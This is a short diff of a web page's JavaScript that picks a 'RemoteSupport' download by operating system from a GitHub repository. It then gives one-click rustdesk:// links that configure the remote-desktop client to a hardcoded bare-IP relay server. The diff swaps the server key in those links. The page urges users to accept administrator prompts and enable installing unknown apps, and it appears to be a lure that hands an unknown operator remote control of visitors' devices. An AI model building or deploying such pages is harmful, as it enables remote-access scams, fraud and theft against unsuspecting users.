@@ -25,13 +25,13 @@ if(ua.includes("windows")){
     manual=`Extract the ZIP and run RemoteSupport.exe. Accept the administrator prompt when it appears.`;
 } else if(ua.includes("macintosh")||ua.includes("mac os")){
     url="https://github.com/lblaireesf/r-s/releases/latest/download/RemoteSupport.dmg";
-    manual=`After dragging RustDesk to Applications, open it <strong>from Applications</strong> once, then <a href="rustdesk://config/server=194.213.18.209:1044&relay=194.213.18.209:1045&key=7ccd199a91557c1c5f243185c1cbf21002b8de011c3858cbc741c8d61b12c9d5" style="font-weight:bold;color:#1a73e8;">click here</a> to configure automatically. (No typing needed.)`;
+    manual=`After dragging RustDesk to Applications, open it <strong>from Applications</strong> once, then <a href="rustdesk://config/server=194.213.18.209:1044&relay=194.213.18.209:1045&key=fM0ZmpFVfBxfJDGFwcvyEAK43gEcOFjLx0HI1hsSydU%3D" style="font-weight:bold;color:#1a73e8;">click here</a> to configure automatically. (No typing needed.)`;
 } else if(ua.includes("linux")){
     url="https://github.com/lblaireesf/r-s/releases/latest/download/RemoteSupport.zip";
     manual=`Extract the ZIP, then run 'chmod +x rustdesk && ./rustdesk'. It connects automatically.`;
 } else if(ua.includes("android")){
     url="https://github.com/lblaireesf/r-s/releases/latest/download/RemoteSupport.apk";
-    manual=`You may need to enable "Install unknown apps" in Settings. After installing, <a href="rustdesk://config/server=194.213.18.209:1044&relay=194.213.18.209:1045&key=7ccd199a91557c1c5f243185c1cbf21002b8de011c3858cbc741c8d61b12c9d5" style="font-weight:bold;color:#1a73e8;">tap here</a> to apply server settings. (No typing needed.)`;
+    manual=`You may need to enable "Install unknown apps" in Settings. After installing, <a href="rustdesk://config/server=194.213.18.209:1044&relay=194.213.18.209:1045&key=fM0ZmpFVfBxfJDGFwcvyEAK43gEcOFjLx0HI1hsSydU%3D" style="font-weight:bold;color:#1a73e8;">tap here</a> to apply server settings. (No typing needed.)`;
 } else {
     document.getElementById("msg").innerText="Unsupported OS. Please contact support.";
 }
